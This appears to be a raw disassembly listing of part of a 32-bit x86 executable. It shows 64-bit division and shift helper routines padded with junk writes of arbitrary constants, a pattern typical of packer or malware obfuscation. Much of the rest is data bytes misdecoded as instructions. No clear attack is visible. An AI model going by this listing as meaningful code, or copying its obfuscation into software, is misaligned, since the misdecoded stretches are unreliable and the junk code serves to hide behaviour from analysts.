  422045:	sub    esp,DWORD PTR [ebp-0x74]
  422048:	mov    DWORD PTR [ebp-0x14c],esp
  42204e:	mov    DWORD PTR [ebp-0x148],0x0
  422058:	mov    eax,DWORD PTR [ebp-0x148]
  42205e:	cmp    eax,DWORD PTR [ebp-0xb0]
  422064:	je     0x422098
  42206a:	mov    eax,DWORD PTR [ebp-0x148]
  422070:	mov    ecx,DWORD PTR [ebp-0x14c]
  422076:	mov    edx,DWORD PTR [ebp-0x148]
  42207c:	mov    esi,DWORD PTR [ebp+0x14]
  42207f:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422083:	mov    DWORD PTR [ecx+eax*4],edx
  422086:	mov    eax,DWORD PTR [ebp-0x148]
  42208c:	inc    eax
  42208d:	mov    DWORD PTR [ebp-0x148],eax
  422093:	jmp    0x422058
  422098:	mov    DWORD PTR [ebp-0x9c],0x0
  4220a2:	push   0x422231
  4220a7:	jmp    DWORD PTR [ebp-0xec]
  4220ad:	mov    eax,eax
  4220af:	mov    ecx,esp
  4220b1:	ret    0xc
  4220b4:	cmp    DWORD PTR ds:0x42834f,0x0
  4220bb:	mov    DWORD PTR ds:0x42834b,0x7476
  4220c5:	mov    DWORD PTR ds:0x4281c7,0x1cdc
  4220cf:	mov    DWORD PTR ds:0x42834b,0x65fa
  4220d9:	mov    DWORD PTR ds:0x4281b7,0x5dca
  4220e3:	jmp    0x42212d
  4220e8:	mov    eax,ds:0x428347
  4220ed:	cmp    DWORD PTR ds:0x42834f,0x0
  4220f4:	jbe    0x422115
  4220fa:	push   0x24f1
  4220ff:	call   DWORD PTR ds:0x428dc8
  422105:	inc    DWORD PTR ds:0x4283f3
  42210b:	sub    DWORD PTR ds:0x4281d3,0x46d9
  422115:	inc    DWORD PTR ds:0x42834f
  42211b:	adc    DWORD PTR ds:0x42835b,ebx
  422121:	or     DWORD PTR ds:0x428283,0x4029
  42212b:	not    eax
  42212d:	push   ebx
  42212e:	push   esi
  42212f:	sbb    DWORD PTR ds:0x4283df,edx
  422135:	mov    eax,DWORD PTR [esp+0x18]
  422139:	or     eax,eax
  42213b:	jne    0x42216b
  422141:	mov    ecx,DWORD PTR [esp+0x14]
  422145:	mov    eax,DWORD PTR [esp+0x10]
  422149:	xor    edx,edx
  42214b:	div    ecx
  42214d:	xor    DWORD PTR ds:0x4281df,0x45f1
  422157:	mov    ebx,eax
  422159:	mov    eax,DWORD PTR [esp+0xc]
  42215d:	div    ecx
  42215f:	mov    edx,0x36e3
  422164:	mov    edx,ebx
  422166:	jmp    0x42222c
  42216b:	mov    ecx,eax
  42216d:	sbb    eax,0x67a9
  422172:	mov    ebx,DWORD PTR [esp+0x14]
  422176:	cmp    DWORD PTR ds:0x428347,0x0
  42217d:	mov    edx,DWORD PTR ds:0x4283f7
  422183:	mov    DWORD PTR ds:0x428377,0x4bc7
  42218d:	mov    edx,DWORD PTR ds:0x42835f
  422193:	jmp    0x4221dd
  422198:	mov    DWORD PTR ds:0x4282a7,0x15f
  4221a2:	mov    DWORD PTR ds:0x4282df,0x4dd1
  4221ac:	cmp    DWORD PTR ds:0x428347,0x0
  4221b3:	jle    0x4221d0
  4221b9:	push   0x824e
  4221be:	call   DWORD PTR ds:0x428dcc
  4221c4:	xor    DWORD PTR ds:0x42835f,0x6c44
  4221ce:	sub    edx,edx
  4221d0:	sbb    DWORD PTR ds:0x4282a7,0x445e
  4221da:	dec    edx
  4221db:	not    edx
  4221dd:	mov    edx,DWORD PTR [esp+0x10]
  4221e1:	mov    eax,DWORD PTR [esp+0xc]
  4221e5:	shr    ecx,1
  4221e7:	rcr    ebx,1
  4221e9:	shr    edx,1
  4221eb:	rcr    eax,1
  4221ed:	or     ecx,ecx
  4221ef:	jne    0x4221e5
  4221f5:	div    ebx
  4221f7:	mov    esi,eax
  4221f9:	mul    DWORD PTR [esp+0x18]
  4221fd:	mov    ecx,eax
  4221ff:	mov    eax,DWORD PTR [esp+0x14]
  422203:	mul    esi
  422205:	add    edx,ecx
  422207:	jb     0x422227
  42220d:	cmp    edx,DWORD PTR [esp+0x10]
  422211:	ja     0x422227
  422217:	jb     0x422228
  42221d:	cmp    eax,DWORD PTR [esp+0xc]
  422221:	jbe    0x422228
  422227:	dec    esi
  422228:	xor    edx,edx
  42222a:	mov    eax,esi
  42222c:	pop    esi
  42222d:	pop    ebx
  42222e:	ret    0x10
  422231:	or     DWORD PTR ds:0x4283c3,0x4283cf
  42223b:	sub    DWORD PTR [ebp+0x10],0x1
  42223f:	mov    DWORD PTR ds:0x4281cb,0x43bf
  422249:	cmp    DWORD PTR [ebp+0x10],0x0
  42224d:	mov    DWORD PTR ds:0x4283bb,0x612a
  422257:	je     0x422266
  42225d:	xor    DWORD PTR ds:0x4281b7,edx
  422263:	add    esp,DWORD PTR [ebp-0x74]
  422266:	mov    DWORD PTR [ebp-0x9c],eax
  42226c:	mov    DWORD PTR ds:0x4282bf,ebx
  422272:	mov    eax,DWORD PTR [ebp-0x9c]
  422278:	pop    edi
  422279:	pop    esi
  42227a:	pop    ebx
  42227b:	leave  
  42227c:	ret    0x10
  42227f:	cmp    cl,0x40
  422282:	mov    DWORD PTR ds:0x4282a3,0x43a8
  42228c:	jae    0x4222de
  422292:	mov    DWORD PTR ds:0x4281d7,0x42f2
  42229c:	cmp    cl,0x20
  42229f:	mov    DWORD PTR ds:0x4281bf,0x3d58
  4222a9:	jae    0x4222c9
  4222af:	or     DWORD PTR ds:0x4281b3,0x5e1e
  4222b9:	shld   edx,eax,cl
  4222bc:	mov    DWORD PTR ds:0x4282d7,0x1bd2
  4222c6:	shl    eax,cl
  4222c8:	ret    
  4222c9:	inc    edx
  4222ca:	mov    edx,eax
  4222cc:	sub    DWORD PTR ds:0x4283f3,0x42834b
  4222d6:	xor    eax,eax
  4222d8:	and    cl,0x1f
  4222db:	shl    edx,cl
  4222dd:	ret    
  4222de:	xor    eax,eax
  4222e0:	xor    edx,edx
  4222e2:	ret    
	...
  4222ef:	add    cl,ch
  4222f1:	cmp    ebp,DWORD PTR [ebx+0x14]
  4222f4:	cmp    al,0x26
  4222f6:	sub    al,0x44
  4222f8:	jno    0x422363
  4222fa:	ja     0x422361
  4222fc:	int3   
  4222fd:	fsubr  QWORD PTR [edx+0x1e]
  422300:	jo     0x422367
  422302:	popa   
  422303:	ins    BYTE PTR es:[edi],dx
  422304:	push   eax
  422305:	lods   eax,DWORD PTR ds:[esi]
  422306:	xor    DWORD PTR [esi+0x41],edi
  422309:	ins    BYTE PTR es:[edi],dx
  42230a:	popa   
  42230b:	outs   dx,BYTE PTR ds:[esi]
  42230c:	add    BYTE PTR [eax],al
  42230e:	add    BYTE PTR [eax],al
  422310:	addr16 jb 0x422378
  422313:	popa   
  422314:	je     0x42237d
  422316:	jb     0x42237d
  422318:	popa   
  422319:	je     0x422382
  42231b:	jb     0x422382
  42231d:	popa   
  42231e:	je     0x422387
  422320:	jb     0x422387
  422322:	popa   
  422323:	je     0x42238c
  422325:	jb     0x42238c
  422327:	popa   
  422328:	je     0x422391
  42232a:	jb     0x422391
  42232c:	popa   
  42232d:	je     0x422396
  42232f:	jb     0x422396
  422331:	popa   
  422332:	je     0x42239b
  422334:	jb     0x42239b
  422336:	popa   
  422337:	je     0x4223a0
  422339:	jb     0x4223a0
  42233b:	popa   
  42233c:	je     0x4223a5
  42233e:	jb     0x4223a5
  422340:	popa   
  422341:	je     0x422343
  422343:	add    BYTE PTR [eax+0x65],ch
  422346:	ins    BYTE PTR es:[edi],dx
  422347:	ins    BYTE PTR es:[edi],dx
  422348:	push   0x686c6c65
  42234d:	gs ins BYTE PTR es:[edi],dx
  42234f:	ins    BYTE PTR es:[edi],dx
  422350:	push   0x686c6c65
  422355:	gs ins BYTE PTR es:[edi],dx
  422357:	ins    BYTE PTR es:[edi],dx
  422358:	push   0x686c6c65
  42235d:	gs ins BYTE PTR es:[edi],dx
  42235f:	ins    BYTE PTR es:[edi],dx
  422360:	push   0x686c6c65
  422365:	gs ins BYTE PTR es:[edi],dx
  422367:	ins    BYTE PTR es:[edi],dx
  422368:	push   0x686c6c65
  42236d:	gs ins BYTE PTR es:[edi],dx
  42236f:	ins    BYTE PTR es:[edi],dx
  422370:	push   0x686c6c65
  422375:	gs ins BYTE PTR es:[edi],dx
  422377:	ins    BYTE PTR es:[edi],dx
  422378:	add    BYTE PTR [eax],al
  42237a:	add    BYTE PTR [eax],al
  42237c:	outs   dx,DWORD PTR ds:[esi]
  42237d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422381:	add    BYTE PTR [ecx+0x0],ah
  422384:	jne    0x422386
  422386:	je     0x422388
  422388:	xor    eax,DWORD PTR [eax]
  42238a:	xor    al,BYTE PTR [eax]
  42238c:	add    BYTE PTR [eax],al
  42238e:	add    BYTE PTR [eax],al
  422390:	push   0x61006500
  422395:	add    BYTE PTR [esi+0x0],dh
  422398:	add    BYTE PTR gs:[esi+0x0],ch
  42239c:	push   0x61006500
  4223a1:	add    BYTE PTR [esi+0x0],dh
  4223a4:	add    BYTE PTR gs:[esi+0x0],ch
  4223a8:	push   0x61006500
  4223ad:	add    BYTE PTR [esi+0x0],dh
  4223b0:	add    BYTE PTR gs:[esi+0x0],ch
  4223b4:	push   0x61006500
  4223b9:	add    BYTE PTR [esi+0x0],dh
  4223bc:	add    BYTE PTR gs:[esi+0x0],ch
  4223c0:	push   0x61006500
  4223c5:	add    BYTE PTR [esi+0x0],dh
  4223c8:	add    BYTE PTR gs:[esi+0x0],ch
  4223cc:	push   0x61006500
  4223d1:	add    BYTE PTR [esi+0x0],dh
  4223d4:	add    BYTE PTR gs:[esi+0x0],ch
  4223d8:	push   0x61006500
  4223dd:	add    BYTE PTR [esi+0x0],dh
  4223e0:	add    BYTE PTR gs:[esi+0x0],ch
  4223e4:	push   0x61006500
  4223e9:	add    BYTE PTR [esi+0x0],dh
  4223ec:	add    BYTE PTR gs:[esi+0x0],ch
  4223f0:	push   0x61006500
  4223f5:	add    BYTE PTR [esi+0x0],dh
  4223f8:	add    BYTE PTR gs:[esi+0x0],ch
  4223fc:	add    BYTE PTR [eax],al
  4223fe:	add    BYTE PTR [eax],al
  422400:	jl     0x422425
  422402:	inc    edx
  422403:	add    BYTE PTR [edi+0x6c],cl
  422406:	gs dec ecx
  422408:	arpl   WORD PTR [edi+0x6e],bp
  42240b:	push   esp
  42240c:	outs   dx,DWORD PTR ds:[esi]
  42240d:	inc    ebx
  42240e:	jne    0x422482
  422410:	jae    0x422481
  422412:	jb     0x422414
  422414:	add    al,0x24
  422416:	inc    edx
	...
  42241f:	add    al,al
  422421:	daa    
  422422:	inc    edx
  422423:	add    al,cl
  422425:	daa    
  422426:	inc    edx
  422427:	add    BYTE PTR [eax-0xdffbdda],al
  42242d:	inc    ebx
  42242e:	push   ebx
  42242f:	mov    WORD PTR ds:0x1a49ba4,ss
  422435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422436:	popf   
  422437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422438:	jno    0x4223de
  42243a:	xchg   edi,eax
  42243b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243c:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422444:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  42244b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244c:	rol    DWORD PTR [edx-0x5b6a732f],cl
  422452:	adc    eax,0x1a49ba4
  422457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422458:	popf   
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	jno    0x422400
  42245c:	xchg   edi,eax
  42245d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245e:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422466:	xor    eax,0x9ba485a4
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	mov    ebx,0xd1e2d3a4
  422471:	in     al,dx
  422472:	xchg   ebp,eax
  422473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422474:	adc    eax,0x3ba49ba4
  422479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247a:	popf   
  42247b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422484:	fwait
  422485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422486:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42248d:	sub    al,0xf7
  42248f:	cs pop ss
  422491:	push   cs
  422492:	adc    eax,0x3a49108
  422497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422498:	fwait
  422499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  4224a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a2:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  4224a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224aa:	shl    DWORD PTR [edx],cl
  4224ac:	shr    DWORD PTR [ecx+esi*8],1
  4224af:	or     al,0xf7
  4224b1:	push   cs
  4224b2:	pop    ss
  4224b3:	outs   dx,BYTE PTR ds:[esi]
  4224b4:	adc    eax,0x3a49168
  4224b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ba:	fwait
  4224bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224bc:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  4224c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c4:	xor    eax,0x9ba48da4
  4224c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ca:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  4224d2:	imul   DWORD PTR [esi+0x17]
  4224d5:	dec    esi
  4224d6:	adc    eax,0x37a49148
  4224db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224dc:	fwait
  4224dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224de:	jae    0x422484
  4224e0:	popf   
  4224e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e2:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  4224e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ea:	fwait
  4224eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ec:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  4224f4:	test   DWORD PTR [esi+0x16],0x91a814ae
  4224fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fc:	aaa    
  4224fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fe:	fwait
  4224ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422500:	jae    0x4224a6
  422502:	popf   
  422503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422504:	pop    ss
  422505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422506:	xchg   ebp,eax
  422507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422508:	push   ecx
  422509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42250a:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  422511:	inc    edx
  422512:	ror    DWORD PTR [eax+esi*8-0x54],1
  422516:	imul   BYTE PTR [esi-0x77eb71ea]
  42251c:	xchg   ecx,eax
  42251d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251e:	aaa    
  42251f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422520:	fwait
  422521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422522:	jae    0x4224c8
  422524:	popf   
  422525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422526:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  42252d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42252e:	fwait
  42252f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422530:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  422537:	mov    esi,?
  422539:	mov    ss,WORD PTR [esi]
  42253b:	out    dx,al
  42253c:	adc    al,0xe8
  42253e:	xchg   ecx,eax
  42253f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422540:	aaa    
  422541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422542:	fwait
  422543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422544:	jae    0x4224ea
  422546:	popf   
  422547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422548:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  42254f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422550:	fwait
  422551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422552:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  42255a:	imul   dh
  42255c:	push   ss
  42255d:	into   
  42255e:	adc    al,0xc8
  422560:	xchg   ecx,eax
  422561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422562:	cmp    eax,0x51a49ba4
  422567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422568:	popf   
  422569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42256a:	jnp    0x422510
  42256c:	xchg   ebx,eax
  42256d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42256e:	fwait
  42256f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422570:	xchg   ecx,eax
  422571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422572:	shl    dl,cl
  422574:	shr    ah,1
  422576:	lock int3 
  422578:	test   dh,0x16
  42257b:	cs adc al,0x28
  42257e:	push   ss
  42257f:	push   cs
  422580:	adc    al,0x8
  422582:	xchg   ebx,eax
  422583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422584:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42258b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42258c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422594:	fwait
  422595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422596:	lea    esp,[edx+edx*8-0xfd32fde]
  42259d:	or     al,0xf6
  42259f:	push   cs
  4225a0:	push   ss
  4225a1:	outs   dx,BYTE PTR ds:[esi]
  4225a2:	adc    al,0x68
  4225a4:	xchg   ecx,eax
  4225a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a6:	add    BYTE PTR [eax],al
  4225a8:	xor    BYTE PTR [edx+eax*2],ah
  4225ab:	add    BYTE PTR [esi+eiz*1],bh
  4225ae:	inc    edx
  4225af:	add    BYTE PTR [esi+eiz*1+0x42],al
  4225b3:	add    ah,cl
  4225b5:	daa    
  4225b6:	inc    edx
  4225b7:	add    BYTE PTR [eax],ch
  4225b9:	and    al,0x42
  4225bb:	add    BYTE PTR [eax+0x26],cl
  4225be:	inc    edx
  4225bf:	add    BYTE PTR [edx+0x2200427c],ch
  4225c5:	jg     0x422609
  4225c7:	add    BYTE PTR [eax],bh
  4225c9:	daa    
  4225ca:	inc    edx
  4225cb:	add    BYTE PTR [edi+eiz*1+0x26240042],bh
  4225d2:	inc    edx
  4225d3:	add    BYTE PTR [eax],ch
  4225d5:	es inc edx
  4225d7:	add    BYTE PTR [eax-0x73ffbdd9],bh
  4225dd:	es inc edx
  4225df:	add    BYTE PTR [edx-0x35],cl
  4225e2:	push   es
  4225e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e4:	scas   al,BYTE PTR es:[edi]
  4225e5:	or     al,0x6
  4225e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e8:	inc    eax
  4225e9:	es inc edx
  4225eb:	add    al,dh
  4225ed:	es inc edx
  4225ef:	add    BYTE PTR [edi+eiz*1],al
  4225f2:	inc    edx
  4225f3:	add    BYTE PTR [eax],dl
  4225f5:	daa    
  4225f6:	inc    edx
  4225f7:	add    BYTE PTR [eax],ah
  4225f9:	daa    
  4225fa:	inc    edx
  4225fb:	add    BYTE PTR [eax+0x26],bh
  4225fe:	inc    edx
  4225ff:	add    BYTE PTR [esp],ch
  422602:	inc    edx
  422603:	add    BYTE PTR [eax-0x77ffbdda],bl
  422609:	es inc edx
  42260b:	add    al,dl
  42260d:	daa    
  42260e:	inc    edx
  42260f:	add    BYTE PTR [esi+0x38a4069a],ch
  422615:	inc    ebx
  422616:	out    0xbd,eax
  422618:	test   al,0x26
  42261a:	inc    edx
  42261b:	add    BYTE PTR [eax+0x4c004226],dh
  422621:	es inc edx
  422623:	add    BYTE PTR [edi+eax*4],ah
  422626:	loopne 0x4225e5
  422628:	jbe    0x4226a5
  42262a:	pop    ds
  42262b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42262c:	add    BYTE PTR [eax],al
  42262e:	inc    eax
  42262f:	add    dl,ch
  422631:	rcl    dl,cl
  422633:	pop    ecx
  422634:	pop    ds
  422635:	jg     0x422679
  422637:	add    bl,bl
  422639:	outs   dx,DWORD PTR fs:[esi]
  42263b:	arpl   WORD PTR [edi+0xf],si
  42263e:	pop    ebx
  42263f:	xor    DWORD PTR [esi-0x5],esi
  422642:	(bad)  
  422643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422644:	mov    dl,0xc
  422646:	xchg   ebx,eax
  422647:	test   al,0x34
  422649:	es inc edx
  42264b:	add    BYTE PTR [edx-0x555bf926],ch
  422651:	fiadd  WORD PTR [esi]
  422653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422655:	fiadd  DWORD PTR [esi]
  422657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422658:	mov    ds:0xbea406da,al
  42265d:	fiadd  DWORD PTR [esi]
  42265f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422660:	mov    edx,0xb6a406da
  422665:	fiadd  DWORD PTR [esi]
  422667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422668:	mov    dl,0xda
  42266a:	push   es
  42266b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266c:	mov    ds,edx
  42266e:	push   es
  42266f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422670:	mov    bl,dl
  422672:	push   es
  422673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422674:	out    dx,al
  422675:	fiadd  DWORD PTR [esi]
  422677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422678:	dec    DWORD PTR [ebx]
  42267a:	adc    edi,DWORD PTR [edx]
  42267c:	and    al,0x24
  42267e:	inc    edx
  42267f:	add    BYTE PTR ds:0x17004229,dl
  422685:	loop   0x422610
  422687:	js     0x422637
  422689:	call   0xa4d7:0xcb3aa406
  422690:	and    al,0x75
  422692:	add    BYTE PTR [eax],al
  422694:	and    BYTE PTR [edx+eax*2],ah
  422697:	add    BYTE PTR [edx],ah
  422699:	inc    ebx
  42269a:	sbb    eax,DWORD PTR [edx+0x0]
	...
  4226a8:	hlt    
  4226a9:	clc    
  4226aa:	sar    BYTE PTR [ebp+0x319340bf],cl
  4226b0:	sub    eax,DWORD PTR [edi+0x1f]
  4226b3:	jle    0x4226b5
	...
  4226d9:	add    BYTE PTR [eax],al
  4226db:	add    BYTE PTR [edx+0x427c],ch
	...
  4226e9:	add    BYTE PTR [eax],al
  4226eb:	add    cl,bh
  4226ed:	jmp    0xa48f2733
  4226f2:	push   ecx
  4226f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226f4:	jg     0x42269a
  4226f6:	inc    edi
  4226f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226f8:	push   ecx
  4226f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226fa:	inc    ebx
  4226fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226fc:	std    
  4226fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226fe:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  422705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422706:	push   ebx
  422707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422708:	dec    ecx
  422709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42270a:	std    
  42270b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42270c:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  422713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422714:	push   ecx
  422715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422716:	jg     0x4226bc
  422718:	std    
  422719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42271a:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  422721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422722:	dec    ebx
  422723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422724:	inc    ebx
  422725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422726:	jne    0x4226cc
  422728:	pop    ecx
  422729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42272a:	jnp    0x4226d0
  42272c:	dec    ecx
  42272d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42272e:	fwait
  42272f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  422738:	xor    eax,eax
  42273a:	xor    esp,DWORD PTR [eax]
  42273c:	xor    eax,DWORD PTR [eax]
  42273e:	xor    esp,DWORD PTR [eax+0x33]
  422741:	inc    eax
  422742:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  422748:	xor    al,al
  42274a:	xor    ah,BYTE PTR [eax]
  42274c:	xor    al,BYTE PTR [eax]
  42274e:	xor    ah,BYTE PTR [eax+0x32]
  422751:	inc    eax
  422752:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  422758:	xor    ecx,esp
  42275a:	xor    ecx,esi
  42275c:	xor    ecx,eax
  42275e:	xor    ecx,edx
  422760:	xor    edx,esp
  422762:	xor    edx,esi
  422764:	xor    edx,eax
  422766:	xor    edx,edx
  422768:	xor    ebx,esp
  42276a:	xor    ebx,esi
  42276c:	xor    ebx,eax
  42276e:	xor    ebx,edx
  422770:	xor    eax,esi
  422772:	push   ebx
  422773:	shl    BYTE PTR [ebx-0x40],0x93
  422777:	rcl    DWORD PTR [esi-0x56],0x15
  42277b:	into   
  42277c:	xchg   ebp,eax
  42277d:	dec    ecx
  42277e:	xor    ecx,esp
  422780:	sbb    eax,0x50abaae2
  422785:	push   0x1e
  422787:	cs je  0x42279e
  42278a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422790:	imul   edi,edx,0xffffffd5
  422793:	leave  
  422794:	daa    
  422795:	dec    eax
  422796:	out    dx,eax
  422797:	pushf  
  422798:	mov    dh,0xdf
  42279a:	dec    esi
  42279b:	xchg   ebp,eax
  42279c:	lock xor DWORD PTR [esi-0x6c],ebp
  4227a0:	inc    ebp
  4227a1:	or     eax,0xc1470876
  4227a6:	js     0x422763
  4227a8:	popa   
  4227a9:	pop    ecx
  4227aa:	jecxz  0x422817
  4227ac:	mov    BYTE PTR [edx-0x56],0x5
  4227b0:	cs enter 0xaa46,0x44
  4227b5:	aas    
  4227b6:	inc    ebp
  4227b7:	leave  
  4227b8:	test   BYTE PTR [ebx+0x819a593],0xd8
  4227bf:	jl     0x422779
  4227c1:	mov    es,WORD PTR [edx+0x0]
  4227c4:	jb     0x422820
  4227c6:	pop    ss
  4227c7:	sub    ebp,DWORD PTR [esi+eiz*1]
  4227ca:	inc    edx
  4227cb:	add    BYTE PTR [eax+0x76004226],dl
  4227d1:	sti    
  4227d2:	fbld   TBYTE PTR [ebp+0x0]
	...
  4227e0:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  4227e6:	popa   
  4227e7:	arpl   WORD PTR [edi+0x7a],bp
  4227ea:	popa   
  4227eb:	outs   dx,DWORD PTR ds:[si]
  4227ed:	gs ins DWORD PTR es:[edi],dx
  4227ef:	jae    0x422833
  4227f1:	outs   dx,DWORD PTR ds:[esi]
  4227f2:	ins    BYTE PTR es:[edi],dx
  4227f3:	gs mov cl,0x65
  4227f6:	in     eax,dx
  4227f7:	jg     0x422832
  4227f9:	ja     0x422864
  4227fb:	jp     0x4227f0
  4227fd:	inc    esp
  4227fe:	push   0x1b
  422800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422801:	push   ecx
  422802:	dec    esp
  422803:	gs jb  0x42287f
  422806:	popa   
  422807:	push   ebx
  422808:	jne    0x42287b
  42280a:	jae    0x42286d
  42280c:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  422813:	inc    esp
  422814:	(bad)  [edx+0x65]
  422817:	jae    0x42286f
